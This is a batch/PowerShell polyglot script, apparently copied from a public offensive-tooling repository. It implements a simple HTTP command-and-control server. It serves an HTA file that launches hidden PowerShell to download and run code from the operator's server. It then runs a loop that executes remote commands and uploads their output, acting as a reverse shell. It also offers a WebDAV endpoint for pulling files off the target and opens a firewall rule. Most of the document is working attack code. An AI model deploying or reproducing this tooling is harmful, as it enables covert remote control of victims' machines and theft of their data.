<# ::
@echo off
powershell -c "iex ((Get-Content '%~f0') -join [Environment]::Newline); iex 'main %*'"
goto :eof

.SYNOPSIS
This script demonstrate how to embed PowerShell in a BAT file and allow
command-line arguments.

.DESCRIPTION
The top of the script begins with <#:: which is a batch redirection direcctive
meaning that <#: will be parsed as :<# which looks like a label in a batch script
but <# is also a valid powershell comment opener.

The next line turns off echo for batch scripts but remember we're now in a PowerShell
comment block so this is meaningless when the script is loaded by PowerShell.

And the last important line is the third line which invokes powershell.exe, loading
the current script. Note also that it invokes the 'main' function in the content
so we must implement a 'main' function below. Finally, we pass %* into the main
function which is the command-line argument collection for the batch script.
#>
<#
Obtained from https://github.com/re4lity/subTee-gits-backups/blob/master/JEWebDav.ps1
#>

<#
  .SYNOPSIS
  
  Simple Reverse Shell over HTTP. Deliver the link to the target and wait for connectback.
  
  Read And Write Files Over WebDAV Proof Of Concept
  
  .PARAMETER Server
  
  Listening Server IP Address
  
#>

<#
Motivation:  During my research on C2 Channels. I started thinking about things normal users can do, and one of them is Map a Drive
This made me curious, if you could write a barebones WebDAV server to receive files.  This is Rugged Code...
I basically just ripped off the responses from live.sysinternals.com to experiment.  But It seems to work for basic idea.

So, you start the server, then on the client side you just map the drive:
net use r: http://192.168.2.63/drive

Then copy files ;-)

Feedback welcome:

I think with a bit more polish and effort you could easily write use a basic webDav server in Python or Posh
To transfer data back and forth?

#>

$Server = '192.168.2.63' #Listening IP. Change This.
$webDAVFolder = '\Webdav'
<#
$net = new-object -ComObject WScript.Network
$net.MapNetworkDrive("r:", "\\192.168.2.63\drive", $true, "192.168.2.63/anaznew", "1q2w3e4r5t")
#>



#Begin WEBDAV Just Enough WebDAV to allow you to map drive to get a binary back to host:)


$webDAVPROPFINDResponse = '<?xml version="1.0" encoding="utf-8"?><D:multistatus xmlns:D="DAV:"><D:response><D:href>http://'+ $Server +'/</D:href><D:propstat><D:status>HTTP/1.1 200 OK</D:status><D:prop><D:getcontenttype/><D:getlastmodified>Thu, 07 Aug 2014 16:33:21 GMT</D:getlastmodified><D:lockdiscovery/><D:ishidden>0</D:ishidden><D:supportedlock><D:lockentry><D:lockscope><D:exclusive/></D:lockscope><D:locktype><D:write/></D:locktype></D:lockentry><D:lockentry><D:lockscope><D:shared/></D:lockscope><D:locktype><D:write/></D:locktype></D:lockentry></D:supportedlock><D:getetag/><D:displayname>/</D:displayname><D:getcontentlanguage/><D:getcontentlength>0</D:getcontentlength><D:iscollection>1</D:iscollection><D:creationdate>2014-05-27T19:01:44.48Z</D:creationdate><D:resourcetype><D:collection/></D:resourcetype></D:prop></D:propstat></D:response></D:multistatus>'

$webDAVPROPPATCHResponse = '<?xml version="1.0"?><a:multistatus xmlns:b="urn:schemas-microsoft-com:office:office" xmlns:a="DAV:"><a:response><a:href>'+ $Server + '/drive/</a:href><a:propstat><a:status>HTTP/1.1 200 OK</a:status><a:prop><b:Author/></a:prop></a:propstat></a:response></a:multistatus>'


#End WEBDAV

function Receive-Request {
   param(      
      $Request
   )
   $output = ""
   $size = $Request.ContentLength64 + 1   
   $buffer = New-Object byte[] $size
   do {
      $count = $Request.InputStream.Read($buffer, 0, $size)
      $output += $Request.ContentEncoding.GetString($buffer, 0, $count)
   } until($count -lt $size)
   $Request.InputStream.Close()
   write-host $output
}

$listener = New-Object System.Net.HttpListener
$listener.Prefixes.Add('http://+:80/') 

netsh advfirewall firewall delete rule name="PoshTest 80" | Out-Null
netsh advfirewall firewall add rule name="PoshTest 80" dir=in action=allow protocol=TCP localport=80 | Out-Null

$listener.Start()
'Listening ...'
while ($true) {
    $context = $listener.GetContext() # blocks until request is received
    $request = $context.Request
    $response = $context.Response
	$hostip = $request.RemoteEndPoint
	#Use this for One-Liner Start
	if ($request.Url -match '/connect$' -and ($request.HttpMethod -eq "GET")) {  
     write-host "Host Connected" -fore Cyan
        $message = '
					$s = "http://' + $Server + '/rat"
					$w = New-Object Net.WebClient 
					while($true)
					{
						$r = $w.DownloadString("$s")
						while($r) {
							$o = invoke-expression $r | out-string 
							$w.UploadString("$s", $o)	
							break
						}
					}
		'

    }		 
	
	if ($request.Url -match '/rat$' -and ($request.HttpMethod -eq "POST") ) { 
		Receive-Request($request)	
	}
    if ($request.Url -match '/rat$' -and ($request.HttpMethod -eq "GET")) {  
        $response.ContentType = 'text/plain'
        $message = Read-Host "PS $hostip>"		
    }
    if ($request.Url -match '/app.hta$' -and ($request.HttpMethod -eq "GET")) {
		$enc = [system.Text.Encoding]::UTF8
		$response.ContentType = 'application/hta'
		$htacode = '<html>
					  <head>
						<script>
						var c = "cmd.exe /c powershell.exe -w hidden -ep bypass -c \"\"IEX ((new-object net.webclient).downloadstring(''http://'`
						+ $Server + '/connect''))\"\"";' + 
						'new ActiveXObject(''WScript.Shell'').Run(c);
						</script>
					  </head>
					  <body>
					  <script>self.close();</script>
					  </body>
					</html>'
		
		$buffer = $enc.GetBytes($htacode)		
		$response.ContentLength64 = $buffer.length
		$output = $response.OutputStream
		$output.Write($buffer, 0, $buffer.length)
		$output.Close()
		continue
	}
	if (($request.Url -match '/drive$') -and ($request.HttpMethod -eq "OPTIONS") ){  
		$response.AddHeader("Allow","OPTIONS, GET, PROPFIND, PUT")
		$response.Close()
		continue
		
    }
    if (($request.Url -match '/drive$') -and ($request.HttpMethod -eq "PROPFIND") ) { 
		$response.AddHeader("Allow","OPTIONS, GET, PROPFIND, PUT")
        $message = $webDAVPROPFINDResponse
    }
	if (($request.Url -match '/drive$') -and ($request.HttpMethod -eq "PROPPATCH") ) {
        $message = $webDAVPROPPATCHResponse
    }
	if (($request.HttpMethod -eq "LOCK") -or ($request.HttpMethod -eq "UNLOCK")) { 
		$Uri = $request.Url 
		$RequestedFileName = $Uri.Segments[-1]		
		$webDAVLOCKResponse = '<?xml version="1.0" encoding="utf-8" ?><d:prop xmlns:d="DAV:">  <d:lockdiscovery> <d:activelock><d:locktype><d:write/></d:locktype><d:lockscope><d:exclusive/></d:lockscope><d:depth>Infinity</d:depth><d:owner> <d:href>'+$Server+'/drive/'+ $RequestedFileName+'</d:href></d:owner><d:timeout>Second-345600</d:timeout><d:locktoken>  <d:href>opaquelocktoken:e71d4fae-5dec-22df-fea5-00a0c93bd5eb1</d:href></d:locktoken> </d:activelock>  </d:lockdiscovery></d:prop>'
        $message = $webDAVLOCKResponse
    }
	if ($request.HttpMethod -eq "PUT") {
		$ms = New-Object System.IO.MemoryStream
		
		[byte[]] $buffer = New-Object byte[] 65536
		[int] $bytesRead | Out-Null
		$Stream = $request.InputStream
		do
		{
			$bytesRead = $Stream.Read($buffer, 0, $buffer.Length)
			$ms.Write($buffer, 0, $bytesRead)
			
		} while ( $bytesRead -ne 0)

		$Uri = $request.Url 
		$ReceivedFileName = $Uri.Segments[-1]
		Write-Host "Receiving File: " $ReceivedFileName -Fore Cyan
		[byte[]] $Content = $ms.ToArray()
		Set-Content -Path "$webDAVFolder\$ReceivedFileName" -Value $Content -Encoding Byte | Out-Null
		$response.Close()
		continue
	}
	if ($request.Url -match '/drive/' -and ($request.HttpMethod -eq "PROPFIND") ){  
		$Uri = $request.Url 
		$RequestedFileName = $Uri.Segments[-1]
		[byte[]] $buffer = [System.IO.File]::ReadAllBytes("$webDAVFolder\$RequestedFileName")
		$webDAVXFERResponse = '<?xml version="1.0" encoding="utf-8"?><D:multistatus xmlns:D="DAV:"><D:response><D:href>http://'+$Server+'/drive/</D:href><D:propstat><D:status>HTTP/1.1 200 OK</D:status><D:prop><D:getcontenttype>application/octet-stream</D:getcontenttype><D:getlastmodified>Thu, 11 Jun 2015 05:20:18 GMT</D:getlastmodified><D:lockdiscovery/><D:ishidden>0</D:ishidden><D:supportedlock><D:lockentry><D:lockscope><D:exclusive/></D:lockscope><D:locktype><D:write/></D:locktype></D:lockentry><D:lockentry><D:lockscope><D:shared/></D:lockscope><D:locktype><D:write/></D:locktype></D:lockentry></D:supportedlock><D:getetag>"3d6f834e6a4d01:0"</D:getetag><D:displayname>'+$RequestedFileName+'</D:displayname><D:getcontentlanguage/><D:getcontentlength>'+ $buffer.Length +'</D:getcontentlength><D:iscollection>0</D:iscollection><D:creationdate>2014-05-27T19:36:39.240Z</D:creationdate><D:resourcetype/></D:prop></D:propstat></D:response></D:multistatus>'
		$message = $webDAVXFERResponse
	}
	if ($request.Url -match '/drive/' -and ($request.HttpMethod -eq "GET") ){ 
		$Uri = $request.Url 
		$RequestedFileName = $Uri.Segments[-1]
		[byte[]] $buffer = [System.IO.File]::ReadAllBytes("$webDAVFolder\$RequestedFileName")
		$response.ContentType = 'application/octet-stream'
		$response.ContentLength64 = $buffer.length
		$output = $response.OutputStream
		$output.Write($buffer, 0, $buffer.length)
		$output.Close()
		continue
		
	}
	
	
    [byte[]] $buffer = [System.Text.Encoding]::UTF8.GetBytes($message)
    $response.ContentLength64 = $buffer.length
    $output = $response.OutputStream
    $output.Write($buffer, 0, $buffer.length)
    $output.Close()
}

$listener.Stop()